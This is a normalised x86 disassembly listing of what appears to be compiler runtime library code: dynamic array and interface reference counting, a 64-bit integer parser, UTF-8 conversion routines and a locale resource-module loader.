mov eax ebx
mov edx [ esi ]
call sub_404698
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404afc
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404c30
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404b14
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4058b8
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_4051fc
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_4028c8
sub_404d54
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] ebx
mov eax [ esp ]
call sub_4047c8
mov edx eax
mov ecx esi
mov eax ebx
call sub_404d48
pop edx
pop esi
pop ebx
retn
sub_404d78
push ebx
push ecx
mov ebx eax
xor eax eax
mov [ esp ] eax
mov eax ebx
call sub_40423c
mov ecx eax
mov eax esp
mov edx ebx
call sub_4046bc
mov eax [ esp ]
pop edx
pop ebx
retn
sub_404da4
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404dc8
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] edx
mov esi eax
mov ebp 0x1
xor edi edi
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xc ] 0x0
test esi esi
jne r-xdata
cmp [ esi + ebp - 0x1 ] 0x20
je r-xdata
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
inc ebp
mov [ esp + 0x10 ] 0x0
mov al [ esi + ebp - 0x1 ]
cmp al 0x2d
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
cmp al 0x2b
jne r-xdata
mov [ esp + 0x10 ] 0x1
inc ebp
jmp r-xdata
mov bl 0x1
cmp [ esi + ebp - 0x1 ] 0x24
je r-xdata
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov al [ esi + ebp - 0x1 ]
call sub_4029a8
cmp al 0x58
je r-xdata
inc ebp
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
jmp r-xdata
add dl 0xf9
sub dl 0x6
jb r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jae r-xdata
mov al [ esi + ebp ]
call sub_4029a8
cmp al 0x58
jne r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x37
jmp r-xdata
add dl 0xe6
sub dl 0x6
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
cmp [ esp + 0xc ] 0x0
jne r-xdata
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
mov edi eax
and edi 0xff
sub edi 0x57
jmp r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
cmp [ esp + 0xc ] 0xfffffff
jne r-xdata
jmp r-xdata
je r-xdata
cmp [ esp + 0x8 ] 0x0
cmp [ esp + 0xc ] 0xccccccc
jne r-xdata
jmp r-xdata
cmp [ esi + ebp - 0x1 ] 0x0
setne al
or bl al
je r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jmp r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xffffffff
jbe r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xcccccccc
jbe r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
mov eax edi
cdq
push edx
push eax
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
shld edx eax 0x4
shl eax 0x4
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
setl al
cmp [ esp + 0x8 ] 0x0
setb al
jmp r-xdata
push 0x0
push 0xa
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
call sub_404da4
push edx
push eax
mov eax edi
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jb r-xdata
dec ebp
cmp al [ esp + 0x10 ]
je r-xdata
sub_405028
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405020
jmp r-xdata
mov al 0x4
call sub_4028c8
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_4028c8
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_4027ac
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_40276c
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402bf8
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_404a04
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_402968
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402bf8
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_405008
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_405028
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_4051c0
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_40278c
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_404a04
sub_4051fc
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_4051c0
pop edx
pop eax
sub_405224
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_40137c
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_405254
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_40130c
mov eax esp
mov dl 0x1
call sub_405490
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_40529c
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_405254
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_4052d8
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_401314
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_40131c
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_4052c4
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_4052c4
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_4052c4
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call sub_4012ec
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call sub_4012e4
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_405490
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_40130c
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_401364
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_405595
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_4052d8
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_40136c
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_401364
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_40135c
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_40136c
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_401364
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_40132c
push eax
call sub_401304
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_405708
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ rw-data ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_405254
mov edx edi
call esi
test al al
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
sub_405764
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_40278c
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_40278c
jmp r-xdata
sub_4057c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_4057ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_405830
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_405894
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4057c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40589b
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_4058b8
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_4058e4
test edx edx
je sub_4058a0
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_4028c8
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_40594c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4032a0
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_405988
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call InterlockedDecrement
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_4059b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_405a8c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_405bc4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405c63
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403f7c
mov eax ebx
xor edx edx
call sub_4047d4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405c6a
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
mov eax ebx
call sub_4047c8
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_4045c8
mov eax ebx
call sub_4047c8
push eax
mov eax [ ebp - 0x4 ]
call sub_40423c
inc eax
push eax
mov eax ebx
call sub_4047b8
push eax
mov eax [ ebp - 0x4 ]
call sub_40443c
pop ecx
pop edx
call sub_4059b0
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f7c
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_4045c8
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403fd0
sub_405c70
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405d07
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_40465c
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405d0e
lea eax [ ebp - 0x4 ]
call sub_40465c
retn
mov eax ebx
call sub_40423c
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_4048a4
mov eax ebx
call sub_40423c
push eax
mov eax [ ebp - 0x4 ]
call sub_4047c8
inc eax
push eax
mov eax ebx
call sub_40443c
push eax
mov eax [ ebp - 0x4 ]
call sub_4047b8
pop ecx
pop edx
call sub_405a8c
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_40465c
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_4048a4
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404698
sub_405d14
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405d57
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4047a8
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405bc4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405d5e
lea eax [ ebp - 0x4 ]
call sub_40465c
retn
sub_405d64
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_404174
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_40529c
push eax
call sub_40133c
mov ecx eax
mov edx esp
mov eax esi
call sub_40406c
jmp r-xdata
sub_405dbc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405e22
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_401304
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_4041ec
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402c18
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405e29
lea eax [ ebp - 0x10 ]
call sub_403f7c
retn
xor ebx ebx
sub_405e30
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405e7a
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405e81
retn
mov eax rw-data
call sub_402a90
mov eax rw-data
call sub_402a90
mov eax rw-data
call sub_402a90
call sub_401b70
sub_405e84
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404d9c
call sub_403024
test al al
